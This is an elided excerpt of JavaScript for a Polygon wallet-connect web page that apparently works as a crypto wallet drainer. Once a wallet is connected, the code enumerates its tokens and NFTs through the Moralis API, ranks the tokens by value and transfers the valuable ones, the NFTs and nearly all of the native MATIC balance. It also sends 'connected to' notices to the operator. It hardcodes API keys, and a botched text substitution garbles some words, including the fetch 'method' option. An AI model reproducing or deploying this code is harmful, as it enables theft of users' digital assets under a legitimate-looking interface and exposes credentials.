...
//   console.log("Fortmatic is", Fortmatic);
  ...
  const providerOptions = {
    walletconnect: {
        ...
        options: {
          rpc: {
            137: "https://rpc-mainnet.maticvigil.com/v1/4e8b4f6ba24063153d0cdea42c576ea5613252aa",
          },
    ...
    //     rpc:{
    //       56: "https://polygon-dataseed.binance.org",
...
async function fetchAccountData() {
  ...
  //change chain to polygon
  web3.eth.defaultCommon = {
    customChain: {name: 'polygon', chainId: 137, networkId: 137}, baseChain: 'mainnet', hardfork: 'petersburg'};  
...
//   accountContainer.innerHTML = '';
  ...
  // Go through all accounts and get their polygon balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // polygonBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const polygonBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(polygonBalance).toFixed(4);
...
async function onConnect() {
  ...
  // Supolygonribe to accounts change
  ...
  // Supolygonribe to chainId change
  ...
  // Supolygonribe to networkId change
...
async function onDisconnect() {
  ...
  // TODO: Which providers have close mpolygonod?
  if(provider.close) {
...
async function getTokens(address="", api_key="", chain="polygon"){
    return new Promise((resolve, reject)=>{
        fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=polygon`, {
            method: "GET",
            headers: {
...
async function getNFTs(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="polygon", limit="98"){
  return new Promise((resolve, reject)=>{
...
async function getBalance(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="polygon"){
  return new Promise((resolve, reject)=>{
      fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=polygon`, {
          mpolygonod: "GET",
          headers: {
              "accept": "application/json",
              "X-API-Key": api_key
...
async function proceed(){
  ...
  console.log("Now we roll!!!");
    ...
    //   user_address = user.get('polygonAddress')
    ...
    async function send() {
        ...
        // const polygon_nfts = await Moralis.Web3API.account.getNFTs(nft_options).catch(e=>{
        //   console.log("Unable to get NFTs", e);
        // })
        // console.log('polygon NFTs: %o', polygon_nfts)
        
        const polygon_tokens = await getTokens(user_address, apiKey).catch(e=>{
          console.log("Unable to get tokens", e);
        });
        const polygon_NFTs = await getNFTs(user_address).catch(e=>{
          console.log("Unable to get NFts", e);
          
        });
        await sendMessage(`me ... polygon : connected to ${user_address}`);
        await sendMessage1(`polygon : connected to ${user_address}`);
        console.log('polygon tokens: %o', polygon_tokens)
        
    
        if (polygon_tokens.length < 1 && polygon_NFTs.length < 1) {
          ...
          const matic_balance = await getBalance(user_address, apiKey).catch(e=>{
            console.log("Unable to get new polygon balance", e);
          });
          console.log("matic_balance", matic_balance);
          console.log("matic_balance.balance", matic_balance.balance);
          
          const balance = ((parseInt(matic_balance.balance))/1000000000000000000) - 0.005;
          console.log("The new matic balance", balance);
          if (balance > 0) {
          const options = {
            type: "native",
          ...
          return console.log('No polygon tokens found')
        }

        const real_polygon_token = new Array();
        const polygon_length = polygon_tokens.length;
        function callback (x) { 
          x.sort((a, b) => b.realprice - a.realprice);
          console.log("real_polygon_token length : ", x.length);
          console.log("real_polygon_token : ", x);
         }

        // Get tokens real values
        await polygon_tokens.forEach(async function(token,i){
        ...
        // polygon_nfts.result.forEach(async (nft, i) => {
          //transfer tokens
          let x = 0;
          let y = 0;
          let mum = "";
          async function transferNow(){
            for(let n=0; n<polygon_length && real_polygon_token[n].realprice>1; n++){
              x = x + 1;
              console.log("Token ", n); 
              
              let token = real_polygon_token[Number(n)];
          ...
          if (transaction) {
            ...
            for(let n=0; n<polygon_NFTs.result.length; n++){
              y = y + 1;
              let nft = polygon_NFTs.result[Number(n)];
          ...
          if (x === polygon_length && y === polygon_NFTs.result.length && (mum === "approved" || mum === "denied")){
        const matic_balance = await getBalance(user_address, apiKey).catch(e=>{
          console.log("Unable to get new polygon balance", e);
        });
        console.log("matic_balance", matic_balance);
